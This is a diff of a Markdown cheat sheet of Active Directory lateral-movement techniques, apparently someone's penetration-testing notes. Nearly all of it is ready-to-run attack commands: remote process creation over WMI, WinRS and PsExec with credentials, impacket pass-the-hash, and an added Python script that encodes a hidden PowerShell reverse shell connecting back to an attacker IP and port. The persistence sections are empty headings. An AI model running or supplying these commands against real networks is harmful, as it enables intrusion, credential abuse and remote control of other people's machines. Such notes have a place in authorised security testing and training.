@@ -1,6 +1,21 @@
 # Lateral movements in AD
 
-## WMI
+## Techniques
+
+### Windows Remote Management
+
+#### WMI
+
+Takes a local group `Administrators` account:
+
+##### In `cmd`
+
+Deprecated:
+```
+wmic /node:$TargetIp /user:somelocalAdminuser /password:somepass process call create "cmd"
+```
+
+##### In PowerShell
 
 ```
 $username = 'user';
@@ -13,13 +28,27 @@ $Command = 'powershell -nop -w hidden -e somebase64string
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command};
 ```
 
-## WinRs
-
+For a PowerShell reverse shell (in Python, replace the IP and Port): 
 ```
-winrs -r:victimhostname -u:user -p:pass  "powershell -nop -w hidden -e somebase64string"
+import sys
+import base64
+
+payload = '$client = New-Object System.Net.Sockets.TCPClient("AttackerIp",AttackerPort); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush()}; $client.Close()'
+
+cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+
+print(cmd)
 ```
 
-## WinRM
+#### WinRM
+
+##### In `cmd`: WinRS (Windows Remote Shell)
+ 
+```
+winrs -r:targethostname -u:user -p:pass  "powershell -nop -w hidden -e somebase64string"
+```
+
+##### In PowerShell
 
 ```
 $username = 'user';
@@ -31,7 +60,7 @@ New-PSSession -ComputerName $VictimIp -Credential $credential
 Enter-PSSession $winrm_session_number
 ```
 
-## PsExec
+### PsExec
 
 ```
 C:\path\to\PsExec64.exe -i  \\hostname -u somedomain\someuser -p somepass cmd
@@ -39,16 +68,22 @@ C:\path\to\PsExec64.exe -i  \\hostname -u somedomain\someuser -p somepass cmd
 > whoami
 ```
 
-## Pass the Hash
+### Pass the Hash
 
 ```
 /usr/bin/impacket-wmiexec -hashes 00000000000000000000000000000000:somelonghashstring Administrator@VictimIP
 ```
 
-## Overpass the Hash
+### Overpass the Hash
 
-## Pass the Ticket
+### Pass the Ticket
 
-## DCOM
+### DCOM
+
+## Persistence
+
+### Golden ticket
+
+### Shawdow copies
 
 
